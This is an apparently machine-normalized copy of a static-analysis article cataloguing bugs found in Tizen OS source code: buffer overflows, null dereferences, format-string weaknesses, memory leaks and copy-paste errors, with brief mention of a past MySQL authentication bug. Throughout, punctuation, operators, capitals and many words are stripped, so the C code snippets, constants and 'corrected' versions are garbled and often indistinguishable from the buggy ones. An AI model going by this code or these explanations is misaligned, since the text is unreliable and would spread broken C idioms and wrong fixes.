pagecountchangedcb void data int int pagecnt int data pagecnt null pagecnt e page count wrong return copypaste method analyzer issued following warning code nonsensical comparison pointer appsviewcircleindicatorc dangerous way using alloca function error let take look code fragment bad lead error practice nt cover case presentation requires additional explanation good time share thought int audioioloopbackintest char buffer alloca size ret audioinread input void buffer size audioioerrornone fwrite buffer size sizeof char fp printf pas size xn size ret else printf fail size xn size ret pvsstudio warning alloca function used inside loop quickly overflow stack audioiotestc software weakness type allocation resource without limit throttling loop run audiostream see allocation stack memory function alloca code nt great quickly run stack memory however say found serious error thing code taken test sure audiostream rather short test error processing thus quite honest say error test continue working however call warning false positive code really bad time may need run test data larger size cause failure time data flow large enough data size free stack much rule moreover code easy fix mean done enough move memory allocation outside loop easily done size allocated buffer change example good code char buffer alloca size ret audioinread input void buffer size audioioerrornone fwrite buffer size sizeof char fp printf pas size xn size ret else printf fail size xn size ret nonexisting buffer used error following code also taken test much serious error cause undefined behavior program test trusted way word test test anything void app app unsigned char data int size bool haveframe unsigned char buffer done data buffer haveframe true readsize offset size offset else size readsize error found pvsstudio warning pointer local array buffer stored outside scope array pointer become invalid mediacodectestc software weakness type return stack variable address function return address array created stack function exit array destroyed returned address function used le element array processed needed error firstly let consider case le element get processed needed typedef int gint typedef gint gboolean define btrequestidrangemax static gboolean reqidused btrequestidrangemax void btinitrequestid void assignedid memset reqidused btrequestidrangemax pvsstudio warning call memset function lead underflow buffer reqidused btserviceutilc software weakness type incorrect calculation buffer size programmer forgot memset function take buffer size byte number element array reason called memset one dangerous function world programming cc function continues wreak havoc various project gboolean type take byte result array set zero element remain uninitialized correct variant code memset reqidused btrequestidrangemax sizeof gboolean possible write memset reqidused sizeof reqidused let take look case may array index bound static void onatspieventcb const atspievent event char buf snprintf buf sizeof buf name idsbrbodyimagettts snprintf buf strlen buf sizeof buf idsaccsbodyselectedtts pvsstudio warning call snprintf function lead overflow buffer buf strlen buf apptrackerc software weakness type incorrect calculation buffer size security operating system well pay attention second call snprintf add something already existing string buffer address expression buf strlen buf function right print le character buffer size subtract strlen buf size buffer forgotten get situation snprintf function writes data outside array correct code snprintf buf strlen buf sizeof buf strlen buf idsaccsbodyselectedtts third code fragment demonstrates case array index bound always occurs first let take look structure define btaddressstringsize typedef struct unsigned char addr bluetoothdeviceaddresst typedef struct int count bluetoothdeviceaddresst address btdpmdevicelistt important u array addr consists element remember size macro btaddressstringsize expands constant incorrect code dpmresultt btdpmgetbluetoothdevicesfromwhitelist garray dpmresultt ret dpmresultfail btdpmdevicelistt devicelist list list list next memset devicelistaddresses addr btaddressstringsize btconvertaddrstringtotype devicelistaddresses addr list data pvsstudio warning call memset function lead overflow buffer devicelistaddresses addr btservicedpmc software weakness type buffer access incorrect length value important thing memset devicelistaddresses addr btaddressstringsize saw earlier size addr byte time memset function set zero byte result array index bound bug call memset function lead overflow buffer devicelistaddresses addr btservicedpmc call memset function lead underflow buffer formattednumber call snprintf function lead overflow buffer ret strlen ret navigatorc call snprintf function lead overflow buffer trait strlen trait navigatorc logic error sequence else error char voicesettinglanguageconvlangtoid const char lang else strcmp langptpt lang return ptpt else strcmp langesmx lang return esmx else strcmp langesus lang return esus else strcmp langelgr lang return elgr pvsstudio warning use else pattern detected probability logical error presence check line voicesettinglanguagec software weakness type expression always false hard say error looking code thing langesmx langesus string identical define langesmx define langesus understand must different since string second condition always false function never return value esus note esmx spanish mexico esus spanish united state error found project interesting copypaste fails exactly bug project error use else pattern detected probability logical error presence check line voicesettinglanguagec use else pattern detected probability logical error presence check line settingcommongeneralfuncc use else pattern detected probability logical error presence check line settingcommongeneralfuncc repeated assignment error let take look error program logic developer wanted exchange value two variable got confused wrote following code void isfwsccontextdel wsccontextisf wscctx wsccontextisf oldfocused focusedic focusedic contextscim focusedic oldfocused pvsstudio warning focusedic variable assigned value twice successively perhaps mistake check line waylandpanelagentmodulecpp software weakness type assignment variable without use unused variable variable focusedic assigned different value twice correct code like wsccontextisf oldfocused focusedic focusedic contextscim contextscim oldfocused however better use function std swap case thus le chance make mistake std swap focusedic contextscim let consider another variant error appeared upon writing similar code perhaps copypaste blame void createprivacypackagelistview appdatas ad elmgenlistitemclass ttc elmgenlistitemclassnew elmgenlistitemclass ptc elmgenlistitemclassnew elmgenlistitemclass mtc elmgenlistitemclassnew ttc itemstyle title ttc functextget gltitletextgetcb ttc funcdel gldelcb ptc itemstyle padding ptc funcdel gldelcb mtc itemstyle multiline mtc functextget glmultitextgetcb ttc funcdel gldelcb pvsstudio warning ttc funcdel variable assigned value twice successively perhaps mistake check line privacypackagelistviewc software weakness type assignment variable without use unused variable latter case value assigned variable mtc funcdel error item variable assigned value twice successively perhaps mistake check line winputsttvoicecpp ad paireditem variable assigned value twice successively perhaps mistake check line btmainviewc ret variable assigned value twice successively perhaps mistake check line mainc ret variable assigned value twice successively perhaps mistake check line settingaboutstatusc ret variable assigned value twice successively perhaps mistake check line settingapplicationsdefaultappc ret variable assigned value twice successively perhaps mistake check line smartmanagerbatteryc ret variable assigned value twice successively perhaps mistake check line settingtimemainc retstr variable assigned value twice successively perhaps mistake check line settingpasswordsimc displaystatus variable assigned value twice successively perhaps mistake check line viewclockc viewing analyzer log noticed fragment need fixing fact lot warning often referred code result stored variable many time row function call talking following code status foo status foo status foo code usually occurs two case result function call nt important compiler analyzer issued warning programmer got rid writing result variable mind would better write void foo x result function call nt important sometimes useful debugging much easier debug code result written variable writing moment code nt safe may seem first glance perhaps fragment result function returned lack attention checked looked code quite fast go deep see work think take closer look warning chance find way defect dereference potentially null pointer error total use null pointer detected diagnostics warning issued dereference pointer may null mynullptr potentially null pointer passed function inside dereferenced strlen mynullptr actually get issued case programmer us incorrect argument interested point point view article difference considered chapter together another story function malloc realloc strdup check pointer null equality possible situation function could allocate memory however programmer adhere bad practice intentionally never write check logic memory need worry let program crash believe approach great heard argument defending fortunately tizen developer kind usually check memory allocated sometimes even necessary static filtermodule filtermodules static void initializemodules const configpointer config filtermodules new filtermodule numberofmodules filtermodules return sense check case program fail allocate memory new operator throw exception std badalloc however another story cited code show usual practice tizen developer check memory allocated still pvsstudio detects enough check lot place discus one case general void quickaccess setbuttoncolor evasobject button int r int g int b int edjemessageintset msg edjemessageintset malloc sizeof msg sizeof int msg count msg val r msg val g msg val b msg val edjeobjectmessagesend elmlayoutedjeget button edjemessageintset msg free msg pvsstudio warning might dereferencing potential null pointer msg quickaccesscpp software weakness type unchecked return value null pointer dereference guarantee malloc function allocate memory yes probability event extremely small check pointer null fragment think code contains real error need fixed however null pointer return function allocate memory situation check pointer using let look couple example first related unsafe use dynamiccast operator int cppaudioinpeek audioinh input const void buffer unsigned int length caudioinput inputhandle dynamiccast caudioinput handle audioiohandle assert inputhandle inputhandle peek buffer length pvsstudio warning might dereferencing potential null pointer inputhandle cppaudioiocpp software weakness type unchecked return value null pointer dereference strange code sure handle audioiohandle store pointer object caudioinput type must use staticcast certainty check necessary assert macro help release version think reasonable add check caudioinput inputhandle dynamiccast caudioinput handle audioiohandle inputhandle nullptr assert false throwerrormsgformat caudioerror eerror errorinvalidhandle handle null way similar code written function analyzer really found flaw program following code may lead real error suppose program always process string however hope would agree code dangerous better play safe chose demonstrate diversity situation analyzer issue warning int main int argc char argv char strstr dp dname char strstr dp dname strncpy tempfilename dp dname strlen dp dname strlen strncpy fileformat strlen pvsstudio warning potential null pointer passed strlen function inspect first argument imageutildecodeencodetestsuitec potential null pointer passed strlen function inspect first argument imageutildecodeencodetestsuitec software weakness type unchecked return value null pointer dereference pointer become null symbol string case later null pointer dereference code fragment pointer may null get dereferenced sense consider article even point providing list still take lot space put warning separate file identical action error static void contentresize const char signal strcmp signal portrait evasobjectsizehintminset sinfolayout elmscalesize width elmscalesize height else evasobjectsizehintminset sinfolayout elmscalesize width elmscalesize height pvsstudio warning statement equivalent else statement pagesettingallc software weakness type know classify really grateful hint regardless condition two similar action carried understand one two call evasobjectsizehintminset function change width height let take look error kind static einabool movecb void data int type void event ecoreeventmousemove move event mouseinfomovex move rootx mouseinfomovey move rooty mouseinfopressed false return ecorecallbackrenew return ecorecallbackrenew pvsstudio warning statement equivalent subsequent code fragment mousec software weakness type return wrong status code strange function check still return value ecorecallbackrenew think return value must different error type statement equivalent else statement bthttpproxyc statement equivalent else statement streamrecordertestc statement equivalent else statement isesttoptioncpp statement equivalent subsequent code fragment dpmtoolkitclic pointer dereferenced error beautiful error data written place int readrequestbody httptransactionh httptransaction char body body realloc body newlen memcpy body currlen ptr bodysize body newlen currlen newlen pvsstudio warning odd value assigned char type pointer probably meant body newlen httprequestc software weakness type outofbounds write function take pointer pointer allows reallocate memory return address new string error line body newlen turn pointer pointer interpreted array pointer array course null case interpreted null pointer written place unknown memory block get damaged addition another error line wo nt end terminal null situation nt really great correct code body newlen condition always truefalse error many reason causing error condition always true false article consider three variant error appear first variant unsigned mcandipagefirst bool cimiclassicview onkeyevent const ckeyevent key mcandipagefirst mcandipagefirst mcandiwindowsize mcandipagefirst mcandipagefirst changemasks candidatemask pvsstudio warning expression mcandipagefirst always false unsigned type value never imiviewclassiccpp software weakness type expression always false variable mcandipagefirst unsigned type therefore value variable le zero protect code overflow rewritten like mcandipagefirst mcandipagefirst mcandiwindowsize mcandipagefirst mcandiwindowsize else mcandipagefirst changemasks candidatemask second variant void quickaccess gridmostvisiteddel void data evasobject browserlogd prettyfunction line data auto itemdata staticcast historyitemdata data itemdata delete itemdata pvsstudio warning expression itemdata always true quickaccesscpp software weakness type expression always true suspicious code fragment pointer data nullptr pointer itemdata nullptr therefore second check meaningless one two situation error instead staticcast operator use operator dynamiccast return nullptr real error messy code second check necessary removed confuse code analyzer programmer hard say whether choose point code corrected third variant typedef enum bthidmousebuttonnone bthidmousebuttonleft bthidmousebuttonright bthidmousebuttonmiddle bthidmousebuttone int bthiddevicesendmouseevent const char remoteaddress const bthidmousedatas mousedata mousedata button bthidmousebuttonleft mousedata button bthidmousebuttonright mousedata button bthidmousebuttonmiddle return bterrorinvalidparameter pvsstudio warning expression always true probably operator used bluetoothhidc software weakness type expression always true understand mistake put value constant shorten code button button button regardless value stored variable always error expression ad transferinfo always true btshareuipopupc expression itemname always true settingsuicpp expression itemname always true settingsuicpp expression urlpair always false genlistmanagercpp expression strlen sformatted always true clockc expression doc void always true settingcommondataslpsettingc confusion enum error provided kind error presentation example long article think make sense write two type enum constant similar name declared typedef enum wifimanagerrssilevele typedef enum wifirssilevele surprising one lost name write code static int rssileveltostrength wifimanagerrssilevele level switch level case case return case return case return case return default return variable level type wifimanagerrssilevele constant type wifirssilevele turn five wrong comparison analyzer issue five warning value different enum type compared switch enumtypea case enumtypeb wific value different enum type compared switch enumtypea case enumtypeb wific value different enum type compared switch enumtypea case enumtypeb wific value different enum type compared switch enumtypea case enumtypeb wific value different enum type compared switch enumtypea case enumtypeb wific software weakness type insufficient comparison funny code work exactly programmer intended thanks luck constant equal despite fact code work moment wrong corrected two reason code look weird analyzer mean look confusing programmer maintain code least one enum value change time constant longer match program perform incorrectly incorrect comparison value different enum type compared switch enumtypea case enumtypeb edevicemgrvideoc value different enum type compared switch enumtypea case enumtypeb edevicemgrvideoc value different enum type compared switch enumtypea case enumtypeb edevicemgrvideoc value different enum type compared switch enumtypea case enumtypeb edevicemgrvideoc value different enum type compared switch enumtypea case enumtypeb edevicemgrvideoc value different enum type compared switch enumtypea case enumtypeb edevicemgrvideoc value different enum type compared switch enumtypea case enumtypeb edevicemgrvideoc value different enum type compared switch enumtypea case enumtypeb edevicemgrvideoc value different enum type compared switch enumtypea case enumtypeb myplaceplacelistc value different enum type compared switch enumtypea case enumtypeb myplaceplacelistc value different enum type compared switch enumtypea case enumtypeb myplaceplacelistc value different enum type compared switch enumtypea case enumtypeb telephonysyspopupnotic value different enum type compared switch enumtypea case enumtypeb telephonysyspopupnotic part condition always truefalse error noticed two error interesting let take look int file fd unsigned char nal unsigned char val zerocount val buffer val zerocount zerocount val break zerocount result fread buffer readsize fd result readsize break val buffer pvsstudio warning part conditional expression always false val playerespushtestc software weakness type expression always false loop run variable val zero beginning loop variable val compared value certainly variable val could never equal otherwise loop would already stop logical error let take look another mistake const int gtsearchnolonger gtsearchincludelonger gtsearchonlylonger bool generictablecontent search const string key int searchtype const else nkeyssize gtsearchonlylonger pvsstudio warning part conditional expression always true gtsearchonlylonger scimgenerictablecpp software weakness type expression always true constant gtsearchonlylonger part condition odd suspect condition actually look like nkeyssize searchtype gtsearchonlylonger confusion type created destroyed object mistake three structure declared related struct sockaddrun safamilyt sunfamily char sunpath struct sockaddrin safamilyt sinfamily inportt sinport struct inaddr sinaddr unsigned char sinzero sizeof struct sockaddr sizeof unsigned short int sizeof inportt sizeof struct inaddr struct sockaddr safamilyt safamily char sadata error lie fact object created object one type destroyed another type class socketaddress socketaddressimpl struct sockaddr mdata socketaddressimpl const socketaddressimpl case scimsocketlocal mdata struct sockaddr new struct sockaddrun len sizeof sockaddrun break case scimsocketinet mdata struct sockaddr new struct sockaddrin len sizeof sockaddrin break socketaddressimpl mdata delete mdata analyzer warning odd object created using new operator immediately cast another type scimsocketcpp odd object created using new operator immediately cast another type scimsocketcpp software weakness type mismatched memory management routine structure type sockaddrun sockaddrin created however stored destroyed sockaddr structure three type mentioned structure related among three different structure different size code may work well structure pod type contain destructors etc call delete operator becomes simple call free function formally code incorrect one destroy object type used creating object said moment program working although formally incorrect one understand considered code dangerous enough one class constructordestructor appear add member complex type example std string break everything completely error odd object created using new operator immediately cast another type scimsocketcpp odd object created using new operator immediately cast another type scimsocketcpp incorrect using printflike function bug static int writefile const char filename void data unsigned long long datasize file fp null filename data datasize fprintf stderr tinvalid data p size lldn filename data datasize return false pvsstudio warning incorrect format consider checking third actual argument fprintf function certain condition pointer null imageutildecodeencodetestsuitec software weakness type null pointer dereference possible pointer filename contain null impossible predict function printf work practice behavior depends used implementation printf see discussion behavior null printf printing specifier let look one mistake void subscribetoevent int error printe failed destroy engine configuration event trigger error pvsstudio warning incorrect format different number actual argument expected calling printf function expected present surveillancetestsuitec software weakness type know exactly classify would grateful hint macro printe expands printf see error variable used apparently one forgot print error number error incorrect format different number actual argument expected calling printf function expected present surveillancetestsuitec incorrect format different number actual argument expected calling printf function expected present surveillancetestsuitec checking pointer executed dereference error static void show void data settingtracebegin struct priv priv struct priv data einalist child elmboxchildrenget priv box evasobject first einalistdataget child evasobject selected einalistnth child priv itemselectedonshow priv err invalid parameter return pvsstudio warning priv pointer utilized verified nullptr check line viewgenericpopupc software weakness type null pointer dereference pointer priv dereferenced twice expression priv box priv itemselectedonshow pointer verified null fix code check moved higher code static void show void data settingtracebegin struct priv priv struct priv data priv err invalid parameter return einalist child elmboxchildrenget priv box evasobject first einalistdataget child evasobject selected einalistnth child priv itemselectedonshow let look difficult case function tickerwindowcreate pointer passed function argument dereferenced static evasobject tickerwindowcreate struct appdata ad check ad pointer evasobjectresize win ad winw indicatorheightget important note pointer dereferenced without checking null word one pas nonnull pointer function tickerwindowcreate let see function actually used static int tickerviewcreate void tickerwin tickerwin tickerwindowcreate tickerad tickerlayout tickerlayout tickerlayoutcreate tickerwin tickerscroller tickerscroller tickerscrollercreate tickerlayout evasobjectshow tickerlayout evasobjectshow tickerscroller evasobjectshow tickerwin tickerad utilsignalemitbywin tickerad win messageshownoeffect indicatorprog pvsstudio warning tickerad pointer utilized verified nullptr check line tickerc software weakness type null pointer dereference tickerad pointer passed tickerwindowcreate function check ticketad indicates pointer may null error core pointer utilized verified nullptr check line mediacodecportgstc eyecondition pointer utilized verified nullptr check line faceeyeconditioncpp dev name pointer utilized verified nullptr check line edevicemgrdevicec deleted private data error static void unsigned char digest context unsigned char finalcount memset context count memset finalcount pvsstudio warning compiler could delete memset function call used flush finalcount buffer memsets function used erase private data wifigeneratepinc software weakness type compiler removal code clear buffer compiler may remove memset function era private data buffer finalcount term c c language function call removed buffer used anywhere else would like note theoretically possible compiler way working common thing compiler really remove function see confusion memory allocation release error first error void generictablecontent setmaxkeylength sizet maxkeylength std vector offset std vector offsetgroupattr offsetsattrs offset new std nothrow std vector maxkeylength offset return offsetsattrs new std nothrow std vector offsetgroupattr maxkeylength offsetsattrs delete offset return pvsstudio warning memory allocated using new operator released using delete operator consider inspecting code probably better use delete offset scimgenerictablecpp software weakness type mismatched memory management routine pointer array object created using new operator stored variable offset mean object must destroyed using operator delete second error static void drawremovelist settingringtonedata ad char fullpath null fullpath char alloca pathmax selectallitem settingtraceerror selectallitem null free fullpath return pvsstudio warning memory allocated using alloca function released using free function consider inspecting operation logic behind fullpath variable settingringtoneremovec software weakness type mismatched memory management routine buffer memory allocated stack possible address buffer passed actual argument function free allowed potentially uninitialized variable error body function appcreate error long highlight essence eextcirclesurface surface wearable surface eextcirclesurfaceconformantadd conform appdata circlesurface surface pvsstudio warning potentially uninitialized pointer surface used winputselectorcpp software weakness type use uninitialized variable variable surface initialized condition wearable performed code protected incorrect string pay much attention first kind defect note number warning case much interested returning analyzer report seen let defect void iseshowsttmode evasobject win snprintf buf buflen gettext idsstskcancel pvsstudio warning dangerous call snprintf function manner line passed could contain format specification example safe code printf str isesttmodecpp software weakness type use externallycontrolled format string code working correctly unreliable dangerous two reason program broken someone us format specifier character idsstskcancel later abstract example one need display message blabla systemdrive blabla perceived format specifier print abracadabra access violation weakness exploited attacker replaced string want print could potentially use benefit case operating system claiming secure code especially situation easy fix enough write snprintf buf buflen gettext idsstskcancel weakness dangerous call snprintf function manner line passed could contain format specification example safe code printf str apptrackerc dangerous call snprintf function manner line passed could contain format specification example safe code printf str screenreadersystemc dangerous call snprintf function manner line passed could contain format specification example safe code printf str screenreadersystemc dangerous call snprintf function manner line passed could contain format specification example safe code printf str navigatorc dangerous call snprintf function manner line passed could contain format specification example safe code printf str navigatorc selfmade declaration mathematical constant error define pi void appsviewcirclegetpos int radius double angle int x int x radius sin angle pi radius co angle pi x x windowcenterx windowcentery pvsstudio warning constant utilized resulting value could inaccurate consider using mpi constant mathh appsviewcirclec constant utilized resulting value could inaccurate consider using mpi constant mathh appsviewcirclec software weakness type know exactly classify would grateful hint admit situation hardly called erroneous precision constant enough practical calculation however believe code modified macro pi odd simply written case standard macro mpi expands accurate value dangerous arithmetic bug extension typedef long int timet extension typedef long int susecondst struct timeval timet tvsec susecondst tvusec static struct timeval static struct timeval void isfprofdebugtime float etime etime pvsstudio warning expression implicitly cast long type float type consider utilizing explicit type cast avoid overflow example double double x scimutilitycpp software weakness type incorrect conversion numeric type number second calculated two timestamps calculation conducted microsecond number second multiplied million calculation conducted long type system tizen overflow may occur easily avoid use type long long double calculation error w expression implicitly cast int type float type consider utilizing explicit type cast avoid loss fractional part example double double x polyshapehittestcpp w expression implicitly cast int type float type consider utilizing explicit type cast avoid loss fractional part example double double x polyshapehittestcpp duration expression implicitly cast int type double type consider utilizing explicit type cast avoid loss fractional part example double double x edevicemgrdevicec code nt look way work error first case despite error code work correctly yes lucky coincidence int bttdsprovidersendactivationresp char address int result bttdsproviderh provider errorcode bterrornone bterr btconverterrortostring errorcode errorcode return errorcode return errorcode pvsstudio warning code operational logic correspond formatting statement indented right always executed possible curly bracket missing bluetoothtdsc software weakness type incorrect block delimitation programmer lucky regardless condition program return value programmer forgot curly bracket correct code follows errorcode bterrornone bterr btconverterrortostring errorcode errorcode return errorcode return errorcode remove single return make code shorter errorcode bterrornone bterr btconverterrortostring errorcode errorcode return errorcode let look interesting case error occurs macro define mcfreeif x x gfree x x null let see macro used static gboolean mcgstinitgstreamer int argcount mcfreeif pvsstudio warning code operational logic correspond formatting second statement always executed possible curly bracket missing mediacodecportgstc software weakness type incorrect block delimitation outofbounds write expand macro get code argcount gfree null result pointer nullified null written outside array bound loss high bit error typedef unsigned char einabool static einabool stateget strcmp part statebrowser return strcmp id appidbrowser else strcmp part statenotbrowser return strcmp id appidbrowser pvsstudio warning saving strcmp function result inside unsigned char type variable inappropriate significant bit could lost breaking program logic gridc software weakness type numeric truncation error strcmp function return following value int type le identical greater please pay attention greater mean number number similar case le hence result placed variable type unsigned char since significant bit lost would violate logic program execution instance number turn risk may seem farfetched however error caused serious vulnerability mysqlmariadb thing user connects mysqlmariadb token evaluated sha password hash compared expected value memcmp function platform return value fall range result case hash comparison procedure expected value always return true regardless hash eventually simple command bash give attacker root access vulnerable mysql server even know password reason became following code file sqlpasswordc typedef char mybool mybool check return memcmp detailed description issue found security vulnerability mysqlmariadb let get back tizen project seems code fragment negation operator missing correct code follows else strcmp part statenotbrowser return strcmp id appidbrowser offbyone error error define opmaxurilen char objecturi opmaxurilen void strncat ddinfo objecturi chstr opmaxurilen strlen ddinfo objecturi pvsstudio warning strncat function call could lead ddinfo objecturi buffer overflow bound contain size buffer number character hold software weakness type offbyone error programmer consider third argument strncat function set many character added string including terminal null explain error simpler example char buf abcd strncat buf e strlen buf longer space new character buffer contains four character terminal null expression buf equal strncpy function copy character e last element array terminal written outside buffer correct variant code strncat ddinfo objecturi chstr opmaxurilen strlen ddinfo objecturi another similar error strncat function call could lead ddinfo name buffer overflow bound contain size buffer number character hold insidious c language undeclared function used error void personrecognizedcb mvsurveillanceeventtriggerh handle mvsourceh source int videostreamid mvsurveillanceresulth eventresult void userdata int label malloc sizeof int numberofpersons pvsstudio warning value int type assigned pointer int type surveillancetestsuitec software weakness type untrusted pointer dereference hidden trap spring code turn tizen operating system thing malloc function declared include stdlibh anywhere verify performing preprocessing looking inside ifile function declared shall deemed return int type analyzer warns exactly saying int value converted pointer system everything correct pointer size match size int error may reveal program significant bit pointer lost error written article collection example error real program see example undeclared function c taken account new operator unlike malloc return null error malloc function allocate memory return null new operator generates std badalloc exception case memory leak want new operator return nullptr nothrow version operator used p new std nothrow pvsstudio analyzer know difference two type new operator warns ordinary new operator generating exception used idea pvsstudio warning point checking new operator return null pointer detected error divided harmless serious one let start harmless error template class class vector private void pushback const value clone new value clone garrayappendval parray clone currentsize pvsstudio warning sense testing clone pointer null memory allocated using new operator exception generated case memory allocation error mapsutilh software weakness type insufficient comparison expression always true check dangerous removed word error excessive check clutter code make complicated let consider dangerous mistake bool cthreadslm load const char fname bool mmap int fd open fname ordonly mbuf new char mbufsize null close fd return false pvsstudio warning sense testing mbuf pointer null memory allocated using new operator exception generated case memory allocation error slmcpp software weakness type even know classify opinion three option fit insufficient comparison expression always false improper resource shutdown release assumed possible allocate memory array character file descriptor closed function return false status reality memory allocated descriptor closed resource leak addition instead function exit exception thrown violate expected workflow program usually error appear refactoring call malloc function replaced new operator following code fragment demonstrates case quite well void settingsafcreator createnewautofillformitem auto itemdata new autofillformitemdata itemdata browserloge malloc failed get itemdata return pvsstudio warning sense testing itemdata pointer null memory allocated using new operator exception generated case memory allocation error settingsafcreatorcpp text message show malloc function used recommendation replacement malloc new done sake beauty really affect anything provoke error old code malloc better leave decide change carefully attentively reviewed three error error left review article give analyzer warning one list file confusion integer double error code long going format article would like show fragment program way give picture click image enlarge pvsstudio warning literal double type assigned variable int type consider inspecting expression addviewerc software weakness type incorrect conversion numeric type code evaluated delay value expressed millisecond default value millisecond one programmer commented code decided value millisecond always used time attentive used value mean halfsecond opinion ie millisecond result variable int type initialized value turn correct variant int delay writing readonly memory error int testbatchoperations char condition mediapath like strncat condition tzplatformmkpath tzusercontent testimage jpg pvsstudio warning calling strncat function cause writing readonly memory inspect first argument mediacontenttestc software weakness type know classify grateful hint luckily code written test cause serious harm nevertheless error deserves attention readonly memory address stored condition variable change memory result undefined behavior likely undefined behavior access violation incorrect loop error enum nssstatus nsssecuritymanagerinitgroupsdyn ret tempfailureretry getpwnamr ret erange buffersize memorylimit bufferresize buffersize continue pvsstudio warning continue operator terminate false loop condition always false check line nsssecuritymanagercpp software weakness type alwaysincorrect control flow implementation easy forget operator continue loop stop loop resume continue statement pass control condition check loop exit beginning loop condition always false operator continue stop loop code rewritten following way fix error true ret tempfailureretry getpwnamr ret erange buffersize memorylimit break bufferresize buffersize second error file continue operator terminate false loop condition always false check line nsssecuritymanagercpp potential memory leak realloc usage error analyzer issue warning see code kind p realloc p n possible allocate memory memory leak null written p pointer whether memory leak occur depends previous value p pointer stored somewhere used analyzer sort intricacy program logic warning false positive large number warning total chose seemed credible perhaps right le error type let consider one detected error static int preferencegetkeyfilesys keynodet keynode int ioerrno char value null case preferencetypestring fgets filebuf sizeof filebuf fp value valuesize valuesize strlen filebuf value char realloc value valuesize value null funcret preferenceerroroutofmemory break strncat value filebuf strlen filebuf else value free value break pvsstudio warning realloc possible leak realloc fails allocating memory original pointer value lost consider assigning realloc temporary pointer preferencec software weakness type improper release memory removing last reference memory leak loop data file read placed buffer buffer size increase using realloc function call example clearly seen realloc function return null value point memory leak error realloc possible leak realloc fails allocating memory original pointer charinfo charvalue lost consider assigning realloc temporary pointer btgattservicec realloc possible leak realloc fails allocating memory original pointer gifdata frame lost consider assigning realloc temporary pointer imageutilc realloc possible leak realloc fails allocating memory original pointer gifdata frame lost consider assigning realloc temporary pointer imageutilc realloc possible leak realloc fails allocating memory original pointer handle srcbuffer lost consider assigning realloc temporary pointer imageutilc realloc possible leak realloc fails allocating memory original pointer gifdata frame lost consider assigning realloc temporary pointer imageutilc realloc possible leak realloc fails allocating memory original pointer body lost consider assigning realloc temporary pointer httprequestc realloc possible leak realloc fails allocating memory original pointer header rspheader lost consider assigning realloc temporary pointer httptransactionc realloc possible leak realloc fails allocating memory original pointer name lost consider assigning realloc temporary pointer popupc realloc possible leak realloc fails allocating memory original pointer tmphstbuf lost consider assigning realloc temporary pointer scimsocketcpp realloc possible leak realloc fails allocating memory original pointer wscctx preeditstr lost consider assigning realloc temporary pointer waylandpanelagentmodulecpp memory leak error first let consider three used function important u return pointer allocated memory char generateroletrait atspiaccessible obj return strdup ret char generatedescriptiontrait atspiaccessible obj return strdup ret char generatestatetrait atspiaccessible obj return strdup ret let consider function body containing error static char generatedescriptionfromrelationobject char rolename generateroletrait obj char descriptionfromrole generatedescriptiontrait obj char statefromrole generatestatetrait obj char desc atspiaccessiblegetdescription obj err err gerrorfree err gfree desc return strdup trait pvsstudio warning function exited without releasing rolename pointer memory leak possible navigatorc function exited without releasing descriptionfromrole pointer memory leak possible navigatorc function exited without releasing statefromrole pointer memory leak possible navigatorc software weakness type improper release memory removing last reference memory leak function atspiaccessiblegetdescription fails generatedescriptionfromrelationobject function cease working time memory whose pointer stored desc variable get freed author code forgot variable rolename descriptionfromrole statefromrole memory leak typo identical code block error bookmarkmanagerui bookmarkmanagerui browserlogd prettyfunction line mmodulestoolbar evasobjectsmartcallbackdel mmodulestoolbar language changed modulestoolbarlanguagechanged evasobjectdel mmodulestoolbar mnavigatortoolbar evasobjectsmartcallbackdel mnavigatortoolbar language changed navigationtoolbarlanguagechanged evasobjectdel mmodulestoolbar pvsstudio warning two similar code fragment found perhaps typo mnavigatortoolbar variable used instead mmodulestoolbar bookmarkmanageruicpp software weakness type duplicate operation resource code destructor written copypaste accidentally one fragment name mmodulestoolbar replaced mnavigatortoolbar dead code error sometimes throwing exception information make easier debugging application written log correct code look like void integrity syncelement ret int err errno loge close function error err strerror err throw unexpectederrorexception err strerror err let take look code written error void integrity createhardlink int ret link oldnamecstr newnamecstr ret int err errno throw unexpectederrorexception err strerror err logn trying link nonexistent oldnamecstr pvsstudio warning unreachable code detected possible error present integritycpp software weakness type dead code think obvious needed swap line exception would thrown writing log let look one mistake define lsfuncenter lslogd enter function define lsfuncexit lslogd exit function static bool checkmyplaceautomation void lsfuncenter bool myplaceautomationsupported false bool myplaceautomationconsent false return false lsfuncexit pvsstudio warning unreachable code detected possible error present myplacesuggestc software weakness type dead code macroepilogue used last two line function changed place error unreachable code detected possible error present bthdpc unreachable code detected possible error present mediacodecportgstc unreachable code detected possible error present myplacec unreachable code detected possible error present settingcommonviewc unreachable code detected possible error present layoutnetworkc unreachable code detected possible error present adidc incorrect initialization object error first let take look way data type declared struct voicedata int voicefwstate std vector std string sttresults ui miceffector effector typedef struct voicedata voicedata pay attention one member voicedata class array string let see instance class created destroyed void showvoiceinput myvoicedata voicedata malloc sizeof voicedata myvoicedata null logd heap overflow line return memset myvoicedata sizeof voicedata void ondestroy voicedata rvoicedata voicedata voicedata voicedata rvoicedata free voicedata pvsstudio warning object myvoicedata nonpassive nonpds type initialized using memset function isesttmodecpp software weakness type mismatched memory management routine object created malloc memset function destroyed using free function result constructor object std vector std string called object used destructor called least memory leak general point thinking code may work definitely undefined behavior terrible project exactly error project error multiplied copying code object myvoicedata nonpassive nonpds type initialized using memset function winputsttisecpp issue error error whose description provide interesting error require lot code demonstration article already quite lengthy wanted speak thirdparty library enumerate type remaining error list odd body function fully equivalent body function error variable x used loop outer loop error recurring check condition already verified previous line error consider inspecting switch statement possible first case operator missing error consider inspecting application logic possible else keyword missing error pattern detected expression excessive contains logical error error class implement copy constructoroperator lack operatorcopy constructor error inappropriate attempt append null character string determine length string strlen function correctly string ending null terminator used first place error type slicing exception caught reference rather value error violated order exception handler exception caught handler base class error consider inspecting virtual function argument see nn argument function foo derived class base class error pointer expression equal nullptr resulting value meaningless used error dereferencing invalid iterator x might take place error assigning value c x variable look suspicious value range variable b error warning found file tizenotherthingstxt intermediate total detected error presentation stated number decided exclude one error writing article noticed one warning actually false positive essential statistic decided explain number article presentation different general line code analyzed comment thus true line code without comment turn analyzer detects error line code lot difficult question answer know average density tizen error code created samsung company data let try expert evaluation yes high chance mistaken still worth trying count according information researcher carnegiemellon university line code contain error turn even linux operating system called analyst one quality standard code considered linux component le one error per line code find exactly got information guarantee accuracy look like truth operating system tizen based linux theoretically also high quality many error line code tizen let take average assume average three error line code pvsstudio analyzer help eliminate still undetected error percent higher new code written safely say pvsstudio analyzer prevent error finished parsing bug found code written copyright samsung company moving analysis external library pay le attention still long way end article time coffeetea break analysis thirdparty project used tizen 